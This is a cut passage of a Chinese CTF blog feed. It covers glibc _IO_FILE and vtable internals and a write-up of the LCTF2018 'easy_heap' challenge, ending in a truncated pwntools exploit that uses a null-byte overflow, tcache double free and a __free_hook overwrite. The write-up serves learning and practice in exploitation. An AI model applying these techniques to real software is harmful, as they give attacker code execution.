_offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>为宽字符准备的结构体 defined _GLIBCPP_USE_WCHAR_T</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;          <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;          <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;         <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;        <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;         <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;         <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;          <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;           <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;         <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;       <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;          <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span>  _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span>             _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="flags字段"><a href="#flags字段" class="headerlink" title="_flags字段"></a>_flags字段</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Magic numbers and bits for the _flags field.</span></span><br><span class="line"><span class="comment">   The magic numbers use the high-order bits of _flags;</span></span><br><span class="line"><span class="comment">   the remaining bits are available for variable flags.</span></span><br><span class="line"><span class="comment">   Note: The magic numbers must all be negative if stdio</span></span><br><span class="line"><span class="comment">   emulation is desired. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure><p>_flag的<code>高两位</code>字节是由libc固定的Magic number</p><p><code>低两位</code>字节的位数规则决定了程序的执行状态</p><p>_mode 字段</p><ul><li><code>_IOFBF</code>（0）：文件流是全缓冲模式。</li><li><code>_IOLBF</code>（1）：文件流是行缓冲模式。</li><li><code>_IONBF</code>（2）：文件流是无缓冲模式。</li><li><code>_IOREADING</code>（3）：文件流当前正在进行读操作。</li><li><code>_IOWRITING</code>（4）：文件流当前正在进行写操作。</li><li><code>_IOAPPEND</code>（8）：文件流是以追加模式打开的。</li><li><code>_IOEOF</code>（16）：文件流已经到达了文件的末尾。</li><li><code>_IOERR</code>（32）：文件流出现了错误。</li><li><code>_IOSTRG</code>（64）：文件流是一个字符串流。</li><li><code>_IORW</code>（128）：文件流是读写模式。</li></ul><blockquote><p>为什么要有输入输出缓冲区？</p><p>主要原因是为了提高程序的性能。输入输出操作通常比内存操作慢得多，因为它们涉及到从硬盘、网络等设备读取或写入数据。使用缓冲区可以减少实际的IO操作次数，从而提高程序的效率。</p><p>考虑IO性能和CPU性能的差距，会缓存一段buffer，这段buffer满或者外部触发时就可以出发写入或者读出操作了。</p></blockquote><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。</p><p>FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。</p><p>在标准 I&#x2F;O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr在libc.so的数据段的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><p>进程里用_IO_FILE._chain构成一个单向链表,链表头部在libc全局变量<strong>_IO_list_all</strong>处</p><p>_IO_list_all_stamp是一个全局变量，它是用于记录所有打开的流（stream）的时间戳（timestamp）的。</p><p><code>extern struct _IO_FILE_plus *_IO_list_all;</code></p><p>初始时单链表是这样的</p><p><code>_IO_list_all--&gt;_IO_2_1_stderr_--&gt;_IO_2_1_stdout_--&gt;_IO_2_1_stdin_</code></p><h3 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h3><p><img src="/2023/03/29/IO-FILE/image-20230329194516352.png" alt="image-20230329194516352"></p><p>可以用<code>p *(struct _IO_FILE_plus *) addr</code>来打印</p><p>可以看出实际应用中我们使用时是<code> _IO_FILE_plus</code>结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;<span class="comment">//32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="偏移"><a href="#偏移" class="headerlink" title="偏移"></a>偏移</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x0   _flags</span><br><span class="line">0x8   _IO_read_ptr</span><br><span class="line">0x10  _IO_read_end</span><br><span class="line">0x18  _IO_read_base</span><br><span class="line">0x20  _IO_write_base</span><br><span class="line">0x28  _IO_write_ptr</span><br><span class="line">0x30  _IO_write_end</span><br><span class="line">0x38  _IO_buf_base</span><br><span class="line">0x40  _IO_buf_end</span><br><span class="line">0x48  _IO_save_base</span><br><span class="line">0x50  _IO_backup_base</span><br><span class="line">0x58  _IO_save_end</span><br><span class="line">0x60  _markers</span><br><span class="line">0x68  _chain</span><br><span class="line">0x70  _fileno</span><br><span class="line">0x74  _flags2</span><br><span class="line">0x78  _old_offset</span><br><span class="line">0x80  _cur_column</span><br><span class="line">0x82  _vtable_offset</span><br><span class="line">0x83  _shortbuf</span><br><span class="line">0x88  _lock</span><br><span class="line">0x90  _offset</span><br><span class="line">0x98  _codecvt</span><br><span class="line">0xa0  _wide_data</span><br><span class="line">0xa8  _freeres_list</span><br><span class="line">0xb0  _freeres_buf</span><br><span class="line">0xb8  __pad5</span><br><span class="line">0xc0  _mode    </span><br><span class="line">0xc4  _unused2</span><br><span class="line">0xd8  vtable</span><br></pre></td></tr></table></figure><p><code>IO_jump_t * vtable;</code>虚表，一下子联想到c++虚函数底层原理</p><p><code>_IO_jump_t</code>中保存了一些可以跳转的函数指针，标准 IO 函数需要文件流指针指引去调用虚表函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2023/03/29/IO-FILE/image-20230329195951585.png" alt="image-20230329195951585" style="zoom:80%;"><p>fp是用fopen打开的一个文件，可以看到实际已经变成_IO_FILE_puls加入链表，这里的stdin、stdout、stderr，fp的vtable指向_IO_jump_t类型结构体_IO_file_jumps</p><p><img src="/2023/03/29/IO-FILE/image-20230329200421200.png" alt="image-20230329200421200"></p><blockquote><p>printf&#x2F;puts 最终会调用<code>_IO_file_xsputn</code></p><p>fclose 最终会调用<code>_IO_FILE_FINISH</code></p><p>fwrite 最终会调用<code>_IO_file_xsputn</code></p><p>fread 最终会调用<code>_IO_file_xsgetn</code></p><p>scanf&#x2F;gets 最终会调用<code>_IO_file_xsgetn</code></p></blockquote><p>先不做源码分析，先单步看一下printf函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);<span class="comment">//梦开始的地方，呜呜</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/IO-FILE/image-20230330001602270.png" alt="image-20230330001602270"></p><p><strong>_IO_file_xsputn</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233744967.png" alt="image-20230329233744967"></p><p><strong>_IO_file_overflow</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233840601.png" alt="image-20230329233840601"></p><p><strong>_IO_doallocbuf</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233956755.png" alt="image-20230329233956755"></p><p><strong>_IO_file_doallocate</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329234222565.png" alt="image-20230329234222565"></p><p><strong>_IO_file_stat</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329234850989.png" alt="image-20230329234850989"></p><p><strong>__fxstat64</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235004997.png" alt="image-20230329235004997"></p><p><strong>malloc@plt</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235217971.png" alt="image-20230329235217971"></p><p><strong>_IO_setb</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235450171.png" alt="image-20230329235450171"></p><p><strong>_IO_do_write</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235615761.png" alt="image-20230329235615761"></p><p><strong>_IO_default_xsputn</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235927623.png" alt="image-20230329235927623"></p><p><strong>_IO_file_overflow</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230330000048279.png" alt="image-20230330000048279"></p><p>下面会循环IO_file_overflow，这个调用就是一个字节一个字节往我们malloc的堆块(缓冲区)里写我们的输出</p><p><img src="/2023/03/29/IO-FILE/image-20230330001359527.png" alt="image-20230330001359527"></p><p>最后会调用我们的write做系统调用输出</p><p><img src="/2023/03/29/IO-FILE/image-20230330001235259.png" alt="image-20230330001235259"></p><p><strong>WTF</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache LCTF2018-PWN-easy_heap</title>
      <link href="/2023/03/28/LCTF2018-PWN-easy-heap/"/>
      <url>/2023/03/28/LCTF2018-PWN-easy-heap/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1UB8-3Iy-UpGObkW6B9YHCQ">https://pan.baidu.com/s/1UB8-3Iy-UpGObkW6B9YHCQ</a><br>提取码：cc8v</p><p>十个堆块一直在变位置，有点绕啊</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/heap&gt; checksec easy_heap </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/heap/easy_heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h2 id="大致情况"><a href="#大致情况" class="headerlink" title="大致情况"></a>大致情况</h2><p>最多十个堆块</p><p>malloc时存在一个null byte overflow，申请固定大小0xF8堆块，a1[a2] &#x3D; 0;正好可以覆盖下一个堆块的inuse位为0</p><p>管理结构在0x202050处</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">    <span class="title">malloc_point</span></span></span><br><span class="line"><span class="class">    <span class="title">size</span></span></span><br></pre></td></tr></table></figure><p>没有其他漏洞了</p><p><strong>大致思路是修改掉一个堆块的prevsize和inuse位，放入unsortedbin，利用unlink放入把一个中间的隔块污染放到unsorted链里来利用,泄露libc的同时构成double free，其实术语应该叫tcache dup，但是哥们感觉double free更形象一点</strong></p><h2 id="overlapping-heap-chunk隔块攻击泄露libc"><a href="#overlapping-heap-chunk隔块攻击泄露libc" class="headerlink" title="overlapping heap chunk隔块攻击泄露libc"></a>overlapping heap chunk隔块攻击泄露libc</h2><p>先申请十个堆块0-9</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">10</span>,<span class="built_in">str</span>(i).encode())</span><br></pre></td></tr></table></figure><p>把下面地址当成我们的chunk0-9基地址</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232549777.png" alt="image-20230328232549777"></p><p>再把0-5释放掉，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(i)</span><br></pre></td></tr></table></figure><p>再释放9(释放9是为了防止直接释放789，会和topchunk合并，9进入tcachebin inuse位不置空)</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224546593.png" alt="image-20230328224546593"></p><p>tacache满了再释放6 7 8</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224823292.png" alt="image-20230328224823292"></p><p>为什么只有chunk6呢？678相邻释放完6再释放7，8前面的堆块为free状态，会触发unlinke</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328225833809.png" alt="image-20230328225833809"></p><p>十个chunk都释放掉了</p><p>再把tcache chunk的7个chunk申请出来，我们才可以接触到unsort bin的chunk，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">0x10</span>, <span class="built_in">str</span>(i).encode())</span><br></pre></td></tr></table></figure><p>把三个都申请出来作为chunk 7 8 9</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232149288.png" alt="image-20230328232149288"></p><p>这个时候chunk8((0x555555757b00))的inuse位为1，presize为0x200，可以把他前面的chunk7(0x555555757a00)申请出来，就可以覆盖chunk8(0x555555757b00)的inuse位</p><p>需要把前面8个chunk申请出来，才可以拿到chunk7(0x555555757a00)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">6</span>)</span>:</span><br><span class="line">       <span class="title function_">delete</span><span class="params">(i)</span></span><br></pre></td></tr></table></figure><p>delete(8)</p><p>delete(7)</p><p>这里先释放8(0x555555757a00)有几点原因</p><ul><li>可以填满填满tcache，7(0x555555757900)进入unsortbin，会有fd和bk指针写入unsortedbin地址</li><li>下一次会先申请到8(0x555555757a00)，来覆盖chunk8(0x555555757b00)的inuse位</li></ul><p><code>new(0xf8,b&#39;null-byte-overflow&#39;)</code></p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328235322081.png" alt="image-20230328235322081"></p><p>目前申请到的0为0x555555757a00，0x555555757b00 previnuse位为0，也就是说0被污染为未使用实际却是使用状态，prevsize是0x200大小，0x555555757900也是free，</p><p>这个时候释放9(0x555555757b00)会触发unlinke,0x555555757900,0x555555757a00，0x555555757b00合并为一个大堆块，这样我们就可以强制把0x555555757a00加入unsortedbin里</p><p>delete(6)</p><p>delete(9)</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329002903347.png" alt="image-20230329002903347"></p><p>这个时候再把0x555555757900申请出来，0x555555757a00会挂上链，fd和bk会有bin值，这时候0x555555757a00还在0处使用就可以show泄露unsortedbin了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment">#拿走tcachebin里的</span></span><br><span class="line">    new(<span class="number">0x10</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">&#x27;900&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>通过__malloc_hook和main_arean和unsortedbin的偏移找到libc基址</p><h2 id="double-free-amp-amp-free-hook"><a href="#double-free-amp-amp-free-hook" class="headerlink" title="double free &amp;&amp; __free_hook"></a>double free &amp;&amp; __free_hook</h2><p>目前state是这样的</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329004708034.png" alt="image-20230329004708034"></p><p>再去申请一个堆不就可以double free了吗</p><p>**你可能会问我们之前不是在 <a href="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/">https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/</a> 说过unbutu18被patch掉了吗，怎么还能double free **</p><blockquote><p>我们注意到在程序delete时</p><p><code> memset(*(void **)(16LL * index + ar), 0, *(unsigned int *)(16LL * index + ar + 8));</code></p><p>这一句就帮助我们绕过double free</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)        </span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在检测doublefree时最简单的就是每一次释放都去遍历一下单链表，但是这样效率太低了，毕竟tcache的出现就是为了速度，ptmalloc2为了效率，在e-&gt;key &#x3D;&#x3D; tcache时才会进行检测double free，因为在使用状态的chunk，e-&gt;key是数据区，基本上是不会满足-&gt;key &#x3D;&#x3D; tcache的，64位程序只有2^48-1分之一的概率，使用状态的也没必要检测double free</p><p>memset(*(void **)(16LL * index + ar), 0, *(unsigned int *)(16LL * index + ar + 8)这一句会帮我们把原本要释放的key抹除掉，e-&gt;key !&#x3D; tcache自然不会检测doublefree</p></blockquote><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329005141653.png" alt="image-20230329005141653"></p><p>free掉0和9</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329014936412.png" alt="image-20230329014936412"></p><p>new(0x10, p64(libc.dump(‘__free_hook’)+base))写入hook到单链表</p><p>new(0x10, ‘fuck’)</p><p>把a10拿出来</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329015143119.png" alt="image-20230329015143119"></p><p>由于在满员下释放了两个堆，又申请了两个，满员了，free掉0和9之前需要再释放几个堆才可以申请下一个</p><p>new(0x10, p64(one_gadget))就可以申请到__free_hook-0x10去，hook掉了__free_hook为onegadget</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329125937130.png" alt="image-20230329125937130"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./easy_heap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(content) &gt;= size:</span><br><span class="line">        io.send(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0xE4B)&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">10</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io) </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i <span 